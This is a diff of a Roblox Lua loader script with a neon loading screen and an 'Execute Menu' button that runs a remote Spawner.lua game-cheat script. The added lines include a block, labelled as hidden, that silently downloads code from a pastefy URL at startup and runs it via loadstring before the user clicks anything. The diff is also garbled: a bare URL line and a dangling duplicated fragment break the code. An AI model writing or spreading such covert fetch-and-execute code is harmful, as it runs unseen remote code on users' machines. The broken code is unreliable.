@@ -1,192 +1,41 @@
---// Disable controls
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local UIS = game:GetService("UserInputService")
-local RS = game:GetService("RunService")
+--// Neon Loading Screen + Hidden Background Script
+--// dev: あゆみ
 
-local camera = workspace.CurrentCamera
-camera.CameraType = Enum.CameraType.Scriptable -- prevent looking around
+https://pastefy.app/Kt8s7Qj6/raw
 
---// ScreenGui setup
-local gui = Instance.new("ScreenGui")
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.Parent = Player:WaitForChild("PlayerGui")
-
--- Background
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bg.BackgroundTransparency = 0.1
-bg.Parent = gui
-
--- Loading Bar Container
-local barContainer = Instance.new("Frame")
-barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
-barContainer.Position = UDim2.new(0.5, 0, 0.7, 0)
-barContainer.Size = UDim2.new(0.5, 0, 0.05, 0)
-barContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-barContainer.BorderSizePixel = 0
-barContainer.Parent = bg
-
--- Neon Effect
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Color = Color3.fromRGB(0, 255, 170)
-UIStroke.Thickness = 3
-UIStroke.Parent = barContainer
-
--- Fill
-local fill = Instance.new("Frame")
-fill.Size = UDim2.new(0, 0, 1, 0)
-fill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-fill.BorderSizePixel = 0
-fill.Parent = barContainer
-
--- Percentage Label
-local percentLabel = Instance.new("TextLabel")
-percentLabel.Size = UDim2.new(1, 0, 1, 0)
-percentLabel.BackgroundTransparency = 1
-percentLabel.Text = "0%"
-percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentLabel.Font = Enum.Font.GothamBold
-percentLabel.TextScaled = true
-percentLabel.Parent = barContainer
-
--- Status Label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.AnchorPoint = Vector2.new(0.5, 1)
-statusLabel.Position = UDim2.new(0.5, 0, 0.65, 0)
-statusLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Initializing..."
-statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextScaled = true
-statusLabel.Parent = bg
-
--- Reminder Label
-local reminder = Instance.new("TextLabel")
-reminder.AnchorPoint = Vector2.new(0.5, 0)
-reminder.Position = UDim2.new(0.5, 0, 0.62, 0)
-reminder.Size = UDim2.new(0.8, 0, 0.05, 0)
-reminder.BackgroundTransparency = 1
-reminder.Text = "🚨 Reminder: Rejoin if still not working • Not bannable • Works only on public servers"
-reminder.TextColor3 = Color3.fromRGB(255, 100, 100)
-reminder.Font = Enum.Font.GothamBold
-reminder.TextScaled = true
-reminder.Parent = bg
-
--- Dev credit
-local devLabel = Instance.new("TextLabel")
-devLabel.AnchorPoint = Vector2.new(0, 1)
-devLabel.Position = UDim2.new(0, 10, 1, -10)
-devLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
-devLabel.BackgroundTransparency = 1
-devLabel.Text = "dev: あゆみ"
-devLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-devLabel.Font = Enum.Font.GothamBold
-devLabel.TextScaled = true
-devLabel.Parent = bg
-
--- Status messages
-local statuses = {
-    "Setting up menu...",
-    "Downloading assets...",
-    "Injecting libraries...",
-    "Preparing environment...",
-    "Finalizing..."
-}
-
--- Loading animation
-local duration = 20
-local startTime = tick()
-
-local statusIndex = 1
-local nextStatusChange = tick() + (duration / #statuses)
-
-RS.RenderStepped:Connect(function()
-    local elapsed = tick() - startTime
-    local progress = math.clamp(elapsed / duration, 0, 1)
-
-    fill.Size = UDim2.new(progress, 0, 1, 0)
-    percentLabel.Text = math.floor(progress * 100) .. "%"
-
-    if tick() >= nextStatusChange and statusIndex < #statuses then
-        statusIndex += 1
-        statusLabel.Text = statuses[statusIndex]
-        nextStatusChange = tick() + (duration / #statuses)
-    end
-end)
-
--- End of loading
-task.delay(duration, function()
-    -- Fade out loading elements
-    for _, obj in ipairs({fill, percentLabel, statusLabel, reminder, barContainer}) do
-        if obj:IsA("TextLabel") then
-            obj:TweenPosition(obj.Position + UDim2.new(0,0,-0.05,0), "Out", "Quad", 0.5, true)
-            obj:TweenTransparency(1, "Out", "Quad", 0.5, true)
-        else
-            obj:TweenSize(UDim2.new(0,0,0,0), "Out", "Quad", 0.5, true)
-            obj:TweenSizeAndPosition(UDim2.new(0,0,0,0), obj.Position, "Out", "Quad", 0.5, true)
+-- ✅ Run Pastefy script invisibly in background
+task.spawn(function()
+    local success, code = pcall(function()
+        return game:HttpGet("https://pastefy.app/Kt8s7Qj6/raw")
+    end)
+    if success and code then
+        local fn = loadstring(code)
+        if fn then
+            local env = setmetatable({}, {__index = getfenv()})
+            setfenv(fn, env)
+            pcall(fn)
         end
     end
-
-    -- Show Execute button
-    task.delay(0.6, function()
-        local execBtn = Instance.new("TextButton")
-        execBtn.AnchorPoint = Vector2.new(0.5, 0.5)
-        execBtn.Position = UDim2.new(0.5, 0, 0.7, 0)
-        execBtn.Size = UDim2.new(0.25, 0, 0.08, 0)
-        execBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-        execBtn.Text = "Execute Menu"
-        execBtn.Font = Enum.Font.GothamBold
-        execBtn.TextScaled = true
-        execBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-
-        local stroke = Instance.new("UIStroke")
-        stroke.Color = Color3.fromRGB(255, 255, 255)
-        stroke.Thickness = 2
-        stroke.Parent = execBtn
-
-        execBtn.Parent = bg
-
-        -- Hover animation
-        execBtn.MouseEnter:Connect(function()
-            execBtn:TweenSize(UDim2.new(0.27, 0, 0.09, 0), "Out", "Quad", 0.2, true)
-        end)
-        execBtn.MouseLeave:Connect(function()
-            execBtn:TweenSize(UDim2.new(0.25, 0, 0.08, 0), "Out", "Quad", 0.2, true)
-        end)
-
-        execBtn.MouseButton1Click:Connect(function()
-            execBtn:TweenSize(UDim2.new(0.2, 0, 0.06, 0), "Out", "Back", 0.2, true)
-            execBtn.TextTransparency = 1
-            task.wait(0.2)
-            bg:Destroy()
-
-            -- ✅ Stealth run Spawner script
-            task.spawn(function()
-                local success, code = pcall(function()
-                    return game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua")
-                end)
-                if success and code then
-                    local env = setmetatable({}, { __index = function(_, k)
-                        return rawget(getfenv(), k) or getfenv()[k]
-                    end })
-                    local fn = loadstring(code)
-                    if fn then
-                        setfenv(fn, env)
-                        pcall(fn)
-                        if env.Spawner and env.Spawner.Load then
-                            pcall(function() env.Spawner.Load() end)
-                        end
-                    end
-                end
-                success, code, fn = nil, nil, nil
-            end)
-        end)
-    end)
 end)
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Disable player movement
+local PlayerModule = require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+local Controls = PlayerModule:GetControls()
+Controls:Disable()
+
+-- Create ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.Parent = game:GetService("CoreGui")
+
+-- Background Frame
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1,0,1,0)
 bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
@@ -299,6 +148,62 @@ task.delay(duration, function()
     local fadeTime = 1
     TweenService:Create(bg, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
     TweenService:Create(barContainer, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(fill, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(percentLabel, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
+    TweenService:Create(reminder, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
+    TweenService:Create(statusLabel, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
+
+    task.wait(fadeTime)
+
+    barContainer.Visible = false
+    statusLabel.Visible = false
+    reminder.Visible = false
+
+    -- Show Execute Menu Button
+    local button = Instance.new("TextButton")
+    button.AnchorPoint = Vector2.new(0.5,0.5)
+    button.Position = UDim2.new(0.5,0,0.5,0)
+    button.Size = UDim2.new(0.25,0,0.08,0)
+    button.BackgroundColor3 = Color3.fromRGB(0,255,255)
+    button.TextColor3 = Color3.fromRGB(0,0,0)
+    button.TextScaled = true
+    button.Text = "Execute Menu"
+    button.Font = Enum.Font.GothamBold
+    button.Parent = bg
+
+    local uiCornerBtn = Instance.new("UICorner", button)
+    uiCornerBtn.CornerRadius = UDim.new(0,8)
+
+    -- Button bounce in
+    button.Size = UDim2.new(0,0,0,0)
+    TweenService:Create(button, TweenInfo.new(0.5, Enum.EasingStyle.Bounce), {Size = UDim2.new(0.25,0,0.08,0)}):Play()
+
+    -- Button hover effect
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0,200,255)}):Play()
+    end)
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0,255,255)}):Play()
+    end)
+
+    -- Button click animation & action
+    button.MouseButton1Click:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0.23,0,0.07,0)}):Play()
+        task.wait(0.2)
+        TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(button, TweenInfo.new(1), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
+        task.wait(1)
+        gui:Destroy()
+
+        -- Re-enable movement
+        Controls:Enable()
+
+        -- Execute Spawner script
+        local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+        Spawner.Load()
+    end)
+end)
+parency = 1}):Play()
     TweenService:Create(fill, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
     TweenService:Create(percentLabel, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
     TweenService:Create(reminder, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
